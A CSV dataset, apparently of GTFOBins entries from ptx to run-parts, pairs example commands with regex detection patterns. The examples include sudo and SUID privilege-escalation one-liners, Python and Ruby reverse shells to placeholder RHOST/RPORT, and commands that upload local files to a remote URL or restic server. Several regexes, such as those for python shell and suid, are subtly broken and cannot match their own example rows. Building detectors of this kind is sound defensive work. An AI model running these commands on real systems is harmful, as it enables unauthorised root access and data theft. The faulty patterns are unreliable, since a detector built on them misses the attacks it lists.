"Name","Function","ExampleCode","RegexStrictV8","Notes"
"ptx","sudo","sudo ptx -w 5000 ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"puppet","shell","puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","(?i)\b(?:\S*/)?puppet\b.*/bin/sh.*\-c",""
"puppet","file-write","puppet apply -e ""file { '$LFILE': content => 'DATA' }""","(?i)\b(?:\S*/)?puppet\b.*(?:""[^""]+""|\'[^\']+\')",""
"puppet","file-read","puppet filebucket -l diff /dev/null $LFILE","(?i)\b(?:\S*/)?puppet\b.*.+",""
"puppet","sudo","sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"pwsh","shell","pwsh","(?i)\b(?:\S*/)?pwsh\b.*.+",""
"pwsh","file-write","pwsh -c '""DATA"" | Out-File $env:LFILE'","(?i)\b(?:\S*/)?pwsh\b.*\-c",""
"pwsh","sudo","sudo pwsh","(?i)\b(?:\S*/)?sudo\b.*.+",""
"python","shell","python -c 'import os; os.system(""/bin/sh"")'","(?i)\b(?:\S*/)?python\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"python","reverse-shell","python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?i)\b(?:\S*/)?python\b.*socket\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*connect\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*int\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*dup2\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*in\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*spawn\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"python","file-upload","python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'","(?i)\b(?:\S*/)?python\b.*urlopen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*encode\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"python","file-upload","python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'","(?i)\b(?:\S*/)?python\b.*TCPServer\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*serve_forever\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"python","file-download","python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'","(?i)\b(?:\S*/)?python\b.*urlretrieve\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"python","file-write","python -c 'open(""file_to_write"",""w+"").write(""DATA"")'","(?i)\b(?:\S*/)?python\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"python","file-read","python -c 'print(open(""file_to_read"").read())'","(?i)\b(?:\S*/)?python\b.*print\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"python","library-load","python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","(?i)\b(?:\S*/)?python\b.*LoadLibrary\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"python","suid","./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","(?i)\b(?:\S*/)?python\b.*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"python","sudo","sudo python -c 'import os; os.system(""/bin/sh"")'","(?i)\b(?:\S*/)?sudo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"python","capabilities","./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'","(?i)\b(?:\S*/)?python\b.*setuid\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"rake","file-read","rake -f $LFILE","(?i)\b(?:\S*/)?rake\b.*.+",""
"rake","shell","rake -p '`/bin/sh 1>&0`'","(?i)\b(?:\S*/)?rake\b.*/bin/sh",""
"rake","sudo","sudo rake -p '`/bin/sh 1>&0`'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"rake","limited-suid","./rake -p '`/bin/sh 1>&0`'","(?i)\b(?:\S*/)?rake\b.*/bin/sh",""
"rc","shell","rc -c '/bin/sh'","(?i)\b(?:\S*/)?rc\b.*/bin/sh.*\-c",""
"rc","suid","./rc -c '/bin/sh -p'","(?i)\b(?:\S*/)?rc\b.*/bin/sh.*\-c",""
"rc","sudo","sudo rc -c '/bin/sh'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"readelf","file-read","readelf -a @$LFILE","(?i)\b(?:\S*/)?readelf\b.*.+",""
"readelf","suid","./readelf -a @$LFILE","(?i)\b(?:\S*/)?readelf\b.*.+",""
"readelf","sudo","sudo readelf -a @$LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"red","file-write","red file_to_write
a
DATA
.
w
q","(?i)\b(?:\S*/)?red\b.*.+",""
"red","file-read","red file_to_read
,p
q","(?i)\b(?:\S*/)?red\b.*.+",""
"red","sudo","sudo red file_to_write
a
DATA
.
w
q","(?i)\b(?:\S*/)?sudo\b.*.+",""
"redcarpet","file-read","redcarpet ""$LFILE""","(?i)\b(?:\S*/)?redcarpet\b.*(?:""[^""]+""|\'[^\']+\')",""
"redcarpet","sudo","sudo redcarpet ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"redis","file-write","redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x ""DATA""
save","(?i)\b(?:\S*/)?redis\-cli\b.*\-c",""
"restic","file-upload","restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","(?i)\b(?:\S*/)?restic\b.*\-r",""
"restic","sudo","sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-r",""
"restic","suid","./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","(?i)\b(?:\S*/)?restic\b.*\-r",""
"rev","file-read","rev $LFILE | rev","(?i)\b(?:\S*/)?rev\b.*.+",""
"rev","suid","./rev $LFILE | rev","(?i)\b(?:\S*/)?rev\b.*.+",""
"rev","sudo","sudo rev $LFILE | rev","(?i)\b(?:\S*/)?sudo\b.*.+",""
"rlogin","file-upload","rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST","(?i)\b(?:\S*/)?rlogin\b.*(?:""[^""]+""|\'[^\']+\')",""
"rlwrap","shell","rlwrap /bin/sh","(?i)\b(?:\S*/)?rlwrap\b.*/bin/sh",""
"rlwrap","file-write","rlwrap -l ""$LFILE"" echo DATA","(?i)\b(?:\S*/)?rlwrap\b.*(?:""[^""]+""|\'[^\']+\')",""
"rlwrap","suid","./rlwrap -H /dev/null /bin/sh -p","(?i)\b(?:\S*/)?rlwrap\b.*/bin/sh",""
"rlwrap","sudo","sudo rlwrap /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"rpm","shell","rpm --eval '%{lua:os.execute(""/bin/sh"")}'","(?i)\b(?:\S*/)?rpm\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"rpm","shell","rpm --pipe '/bin/sh 0<&1'","(?i)\b(?:\S*/)?rpm\b.*/bin/sh",""
"rpm","limited-suid","./rpm --eval '%{lua:os.execute(""/bin/sh"")}'","(?i)\b(?:\S*/)?rpm\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"rpm","sudo","sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'","(?i)\b(?:\S*/)?sudo\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"rpm","sudo","sudo rpm -ivh x-1.0-1.noarch.rpm","(?i)\b(?:\S*/)?sudo\b.*.+",""
"rpmdb","shell","rpmdb --eval '%(/bin/sh 1>&2)'","(?i)\b(?:\S*/)?rpmdb\b.*/bin/sh",""
"rpmdb","limited-suid","./rpmdb --eval '%(/bin/sh 1>&2)'","(?i)\b(?:\S*/)?rpmdb\b.*/bin/sh",""
"rpmdb","sudo","sudo rpmdb --eval '%(/bin/sh 1>&2)'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"rpmquery","shell","rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","(?i)\b(?:\S*/)?rpmquery\b.*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"rpmquery","limited-suid","./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'","(?i)\b(?:\S*/)?rpmquery\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"rpmquery","sudo","sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","(?i)\b(?:\S*/)?sudo\b.*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"rpmverify","shell","rpmverify --eval '%(/bin/sh 1>&2)'","(?i)\b(?:\S*/)?rpmverify\b.*/bin/sh",""
"rpmverify","limited-suid","./rpmverify --eval '%(/bin/sh 1>&2)'","(?i)\b(?:\S*/)?rpmverify\b.*/bin/sh",""
"rpmverify","sudo","sudo rpmverify --eval '%(/bin/sh 1>&2)'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"rsync","shell","rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","(?i)\b(?:\S*/)?rsync\b.*\-c",""
"rsync","sudo","sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"rsync","suid","./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","(?i)\b(?:\S*/)?rsync\b.*\-c",""
"rtorrent","shell","echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
rtorrent","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"rtorrent","suid","echo ""execute = /bin/sh,-p,-c,\""/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
./rtorrent","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"ruby","shell","ruby -e 'exec ""/bin/sh""'","(?i)\b(?:\S*/)?ruby\b.*/bin/sh",""
"ruby","reverse-shell","ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","(?i)\b(?:\S*/)?ruby\b.*new\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*popen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*\-r",""
"ruby","file-upload","ruby -run -e httpd . -p $LPORT","(?i)\b(?:\S*/)?ruby\b.*\-r",""
"ruby","file-download","ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'","(?i)\b(?:\S*/)?ruby\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*copy_stream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"ruby","file-write","ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'","(?i)\b(?:\S*/)?ruby\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"ruby","file-read","ruby -e 'puts File.read(""file_to_read"")'","(?i)\b(?:\S*/)?ruby\b.*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"ruby","library-load","ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'","(?i)\b(?:\S*/)?ruby\b.*dlopen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"ruby","sudo","sudo ruby -e 'exec ""/bin/sh""'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"ruby","capabilities","./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'","(?i)\b(?:\S*/)?ruby\b.*setuid\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"run-mailcap","shell","run-mailcap --action=view /etc/hosts
!/bin/sh","(?i)\b(?:\S*/)?run\-mailcap\b.*/bin/sh",""
"run-mailcap","file-read","run-mailcap --action=view file_to_read","(?i)\b(?:\S*/)?run\-mailcap\b.*.+",""
"run-mailcap","file-write","run-mailcap --action=edit file_to_read","(?i)\b(?:\S*/)?run\-mailcap\b.*.+",""
"run-mailcap","sudo","sudo run-mailcap --action=view /etc/hosts
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"run-parts","shell","run-parts --new-session --regex '^sh$' /bin","(?i)\b(?:\S*/)?run\-parts\b.*\-r",""
"run-parts","sudo","sudo run-parts --new-session --regex '^sh$' /bin","(?i)\b(?:\S*/)?sudo\b.*\-r",""
"run-parts","suid","./run-parts --new-session --regex '^sh$' /bin --arg='-p'","(?i)\b(?:\S*/)?run\-parts\b.*\-r",""
